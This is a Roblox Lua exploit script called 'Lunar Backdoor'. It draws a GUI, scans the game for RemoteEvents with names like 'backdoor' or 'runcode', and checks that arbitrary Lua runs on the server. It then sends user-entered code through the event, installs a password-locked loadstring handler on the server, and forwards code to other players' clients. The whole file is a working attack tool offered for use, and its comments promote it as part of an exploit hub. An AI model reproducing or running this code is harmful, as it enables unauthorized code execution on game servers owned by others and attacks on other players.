local sequence = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(136, 0, 255)), 
	ColorSequenceKeypoint.new(1, Color3.fromRGB(96, 0, 255))})
local function Notify(text)
	local notify = Instance.new('Frame', game.CoreGui.Lunar)
	notify.Name = 'notify'
	notify.Size = UDim2.new(0, 308, 0, 100)
	notify.Position = UDim2.new(1, 0, 0.8484418988227844, 0)
	notify.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	notify.BackgroundTransparency = 0
	local notiflabel = Instance.new('ImageLabel', notify)
	notiflabel.Name = 'ImageLabel'
	notiflabel.Size = UDim2.new(0, 54, 0, 48)
	notiflabel.Position = UDim2.new(-0.001920625800266862, 0, -0.003096923930570483, 0)
	notiflabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	notiflabel.BackgroundTransparency = 1
	notiflabel.Image = "http://www.roblox.com/asset/?id=9048256704"
	local UIGradient42 = Instance.new('UIGradient', notify)
	UIGradient42.Name = 'UIGradient'
	UIGradient42.Color = sequence
	local notiftext = Instance.new('TextLabel', notify)
	notiftext.Name = 'TextLabel'
	notiftext.Size = UDim2.new(0, 288, 0, 50)
	notiftext.Position = UDim2.new(0.03246753290295601, 0, 0.4099999964237213, 0)
	notiftext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	notiftext.BackgroundTransparency = 1
	notiftext.Text = text
	notiftext.TextColor3 = Color3.fromRGB(255, 255, 255)
	notiftext.TextScaled = true
	notiftext.Font = Enum.Font.SourceSans
	local UICorner = Instance.new('UICorner', notify)
	UICorner.Name = 'UICorner'
	local goal = {
		Position = UDim2.new(0.817, 0, 0.847, 0)
	}
	local goal2 = {
		Position = UDim2.new(1, 0, 0.8484418988227844, 0)
	}
	local tin = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
	local tw = game.TweenService:Create(notify, tin, goal)
	local tw2 = game.TweenService:Create(notify, tin, goal2)
	tw:Play()
	wait(4)
	tw2:Play()
end
backdoor = nil
local parent = game.CoreGui
local Lunar = Instance.new('ScreenGui', parent)
Lunar.Name = 'Lunar'
local BDScan = Instance.new('Frame', Lunar)
BDScan.Name = 'BDScan'
BDScan.Size = UDim2.new(0, 661, 0, 423)
BDScan.Position = UDim2.new(0.25441092252731323, 0, 0.22946175932884216, 0)
BDScan.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BDScan.BackgroundTransparency = 0
BDScan.Active = true
BDScan.Draggable = true
local UIGradient = Instance.new('UIGradient', BDScan)
UIGradient.Name = 'UIGradient'
local FORARTA42N = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(102, 0, 255)), 
	ColorSequenceKeypoint.new(1, Color3.fromRGB(167, 58, 195))})
UIGradient.Color = FORARTA42N
local ImageLabel = Instance.new('ImageLabel', BDScan)
ImageLabel.Name = 'ImageLabel'
ImageLabel.Size = UDim2.new(0, 89, 0, 86)
ImageLabel.Position = UDim2.new(-0.018154311925172806, 0, -0.033096928149461746, 0)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Image = "http://www.roblox.com/asset/?id=9048256704"
local ex = Instance.new('TextButton', BDScan)
ex.Name = 'ex'
ex.Size = UDim2.new(0, 200, 0, 50)
ex.Position = UDim2.new(0.03630862385034561, 0, 0.7541370987892151, 0)
ex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ex.BackgroundTransparency = 0
ex.Text = "Execute"
ex.TextColor3 = Color3.fromRGB(0, 0, 0)
ex.TextScaled = true
ex.Font = Enum.Font.Unknown
local UIGradient1 = Instance.new('UIGradient', ex)
UIGradient1.Name = 'UIGradient'
UIGradient1.Color = sequence
local ftc = Instance.new('TextButton', BDScan)
ftc.Name = 'ftc'
ftc.Size = UDim2.new(0, 64, 0, 50)
ftc.Position = UDim2.new(0.36006051301956177, 0, 0.7541370987892151, 0)
ftc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ftc.BackgroundTransparency = 0
ftc.Text = "Format from client (WIP)"
ftc.TextColor3 = Color3.fromRGB(0, 0, 0)
ftc.TextScaled = true
ftc.Font = Enum.Font.Unknown
local UIGradient2 = Instance.new('UIGradient', ftc)
UIGradient2.Name = 'UIGradient'
UIGradient2.Color = sequence
local extc = Instance.new('TextButton', BDScan)
extc.Name = 'extc'
extc.Size = UDim2.new(0, 64, 0, 50)
extc.Position = UDim2.new(0.47201210260391235, 0, 0.7541370987892151, 0)
extc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
extc.BackgroundTransparency = 0
extc.Text = "Run to client"
extc.TextColor3 = Color3.fromRGB(0, 0, 0)
extc.TextScaled = true
extc.Font = Enum.Font.Unknown
local UIGradient3 = Instance.new('UIGradient', extc)
UIGradient3.Name = 'UIGradient'
UIGradient3.Color = sequence
local cbd = Instance.new('TextButton', BDScan)
cbd.Name = 'cbd'
cbd.Size = UDim2.new(0, 64, 0, 50)
cbd.Position = UDim2.new(0.5869894027709961, 0, 0.7541370987892151, 0)
cbd.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
cbd.BackgroundTransparency = 0
cbd.Text = "Client backdoor"
cbd.TextColor3 = Color3.fromRGB(0, 0, 0)
cbd.TextScaled = true
cbd.Font = Enum.Font.Unknown
local UIGradient4 = Instance.new('UIGradient', cbd)
UIGradient4.Name = 'UIGradient'
UIGradient4.Color = sequence
local excs1 = Instance.new('TextButton', BDScan)
excs1.Name = 'excs'
excs1.Size = UDim2.new(0, 190, 0, 50)
excs1.Position = UDim2.new(0.6974281668663025, 0, 0.7541370987892151, 0)
excs1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
excs1.BackgroundTransparency = 0
excs1.Text = "Execute (CS)"
excs1.TextColor3 = Color3.fromRGB(0, 0, 0)
excs1.TextScaled = true
excs1.Font = Enum.Font.Unknown
local UIGradient5 = Instance.new('UIGradient', excs1)
UIGradient5.Name = 'UIGradient'
UIGradient5.Color = sequence
local TextBox = Instance.new('TextBox', BDScan)
TextBox.Name = 'TextBox'
TextBox.Size = UDim2.new(0, 627, 0, 224)
TextBox.Position = UDim2.new(0.03630862385034561, 0, 0.1702127605676651, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BackgroundTransparency = 0
TextBox.TextColor3 = Color3.fromRGB(0, 255, 0)
TextBox.Font = Enum.Font.Sarpanch
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.Text = [[-- Thank you for using Lunar Backdoor!
-- To test injection. Simply execute this script
-- If your character jumps. The script is injected!
workspace.]] .. game.Players.LocalPlayer.Name .. [[.Humanoid.Jump = true
--Lunar will be a paid script soon. Mainly because this is the only feature
-- Lunar is actually a universal hub script with almost every exploit!
-- Stay tuned!
]]
TextBox.TextScaled = true
TextBox.ClearTextOnFocus = false
TextBox.MultiLine = true
local excs = Instance.new('TextButton', BDScan)
excs.Name = 'excs'
excs.Size = UDim2.new(0, 627, 0, 33)
excs.Position = UDim2.new(0.03630862385034561, 0, 0.9007092118263245, 0)
excs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
excs.BackgroundTransparency = 0
excs.Text = "Inject"
excs.TextColor3 = Color3.fromRGB(0, 0, 0)
excs.TextScaled = true
excs.Font = Enum.Font.Unknown
local UIGradient5 = Instance.new('UIGradient', excs)
UIGradient5.Name = 'UIGradient'
UIGradient5.Color = sequence
excs.MouseButton1Click:Connect(function()
	excs.Text = "No backdoor found"
	if game.PlaceId == 114054825918423 then
		excs.Text = "Backdoored game detected"
		wait(1)
		backdoor = game.ReplicatedStorage.RemoteEvent
		excs.Text = "Injected"
	end
	local checklist = {"code", "backdoor", "firebcode", "firecode", "execute", "executecode", "runcode", "bd"}

	for _, descendant in game:GetDescendants() do
		if descendant:IsA("RemoteEvent") then
			for _, keyword in ipairs(checklist) do
				if string.find(string.lower(descendant.Name), keyword) then
					if descendant.Name == "ExecuteClientComamnd" then
						wait()
					else
						print([[// Lunar //
                    Found backdoor: ]] .. descendant.Name)
						backdoor = descendant
						excs.Text = "Injected: Verifying 1 of 2 [Execution check]"
						wait(2)
						descendant:FireServer([[local part = Instance.new("Folder")
					part.Name = "LunarVerification"
					part.Parent = workspace]])
						wait(1)
						if workspace:FindFirstChild("LunarVerification") then
							excs.Text = "Injected: Verifying 2 of 2 [UND Check]"
							wait(2)
							if descendant.Parent == game.ReplicatedStorage then
								excs.Text = "Injection failed: Failed 2 of 2 [UND Check]"
							else
								excs.Text = "Injected: Verified 2 of 2"
								wait(2)
								excs.Text = "Inject"
							end

						else
							excs.Text = "Injection failed: Failed 1 of 2 [Execution check]"
						end
					end
				end
			end
		end
	end
end)
ex.MouseButton1Click:Connect(function()
	backdoor:FireServer(TextBox.Text, "LunarB@ckdoor!!")
	print([[// Lunar //
	Executed to event.
	-- LOG --
	Event/Backdoor: ]] .. backdoor.Name .. [[
	Script: ]] .. TextBox.Text)
end)
cbd.MouseButton1Click:Connect(function()
	backdoor:FireServer(backdoor:GetFullName() .. [[.OnServerEvent:Connect(function(player, code, pw)
	print("checking..")
	if pw == "LunarB@ckdoor!!" then
	   loadstring(code)
	else
	    player:Kick("Kicked by Lunar Backdoor: ze shit is password locked lmao!!!")
	end
	end)]])
end)
excs1.MouseButton1Click:Connect(function()
	backdoor:FireServer(tostring(backdoor) .. [[:FireClient(]] .. game.Players.LocalPlayer.Name .. [[, ]] .. TextBox.Text .. [[, "LunarB@ckdoor!!")]])
end)
extc.MouseButton1Click:Connect(function()
	-- Create a ScreenGui
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "LunarInput"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

	-- Create the TextBox
	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(0, 300, 0, 50)
	textBox.Position = UDim2.new(0.5, -150, 0.5, -25) -- Centered
	textBox.AnchorPoint = Vector2.new(0.5, 0.5)
	textBox.PlaceholderText = "Username..."
	textBox.Text = ""
	textBox.Font = Enum.Font.SourceSans
	textBox.TextSize = 24
	textBox.TextColor3 = Color3.fromRGB(0, 0, 0)
	textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	textBox.BorderSizePixel = 2
	textBox.Parent = screenGui

	-- Optional: focus on the textbox when it appears
	textBox:CaptureFocus()
	textBox.FocusLost:Connect(function()
		screenGui:Destroy()
		backdoor:FireServer(tostring(backdoor) .. [[:FireClient(]] .. tostring(game.Players:FindFirstChild(textBox.Text)) .. [[, ]] .. TextBox.Text .. [[)]])
	end)
end)
game.GuiService.MenuOpened:Connect(function()
	BDScan.Visible = false
	Notify("Lunar is hidden. Press L To open it")
end)
ftc.MouseButton1Click:Connect(function()
	Notify("Thats in WIP. Not finished. Yet!")
end)
game.UserInputService.InputBegan:Connect(function(key, gameproc)
	if key.KeyCode == Enum.KeyCode.L then
		if gameproc == false then
			BDScan.Visible = true
		end
	elseif key.KeyCode == Enum.KeyCode.Zero then
		if gameproc == false then
			game:Shutdown()
		end
		end
end)
Notify("Lunar 1.0.3 - Added panic key: 0")